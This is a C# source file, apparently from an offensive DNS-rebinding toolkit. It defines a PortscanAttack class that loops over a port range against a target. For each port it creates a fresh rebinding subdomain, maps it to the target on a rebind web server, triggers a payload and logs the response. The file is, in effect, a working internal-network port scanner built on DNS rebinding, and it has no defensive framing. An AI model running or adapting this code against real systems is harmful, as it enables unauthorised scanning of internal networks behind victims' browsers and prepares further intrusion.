using System;
using System.Threading.Tasks;

namespace RebindMeta
{
	public class PortscanAttack
	{
		
		private readonly RebindDnsServer _dnsServer;
		private readonly RebindWebServer _webServer;
		private readonly PayloadTriggerBase _trigger;
		public PortscanAttack(RebindDnsServer dnsServer, RebindWebServer webServer, PayloadTriggerBase trigger)
		{
			_dnsServer = dnsServer;
			_webServer = webServer;
			_trigger = trigger;
		}
		public async Task Attack(AttackTarget originalTarget, int startPort, int endPort)
		{
			if (startPort < 1 || endPort > 65535 || endPort < startPort) throw new Exception($"Bad port range {startPort}-{endPort}");
			// Spin wheels for a while before starting.
			await Task.Delay(1000);

			for(int port = startPort; port <= endPort; port++)
			{
				AttackTarget target = originalTarget.WithPort(port);

				string hostname = _dnsServer.GetSubdomain($"xss{DateTime.Now.ToFileTime()}zz");

				_webServer.AddRebindTarget(hostname, target.RebindTarget);

				Logger.WriteLine($"Triggering attack, port {target.Port}");

				string resp = await _trigger.TriggerAsync(hostname, target);

				Logger.WriteLine($"Attack response {resp}");

				await Task.Delay(1);
			}
		}
	}
}
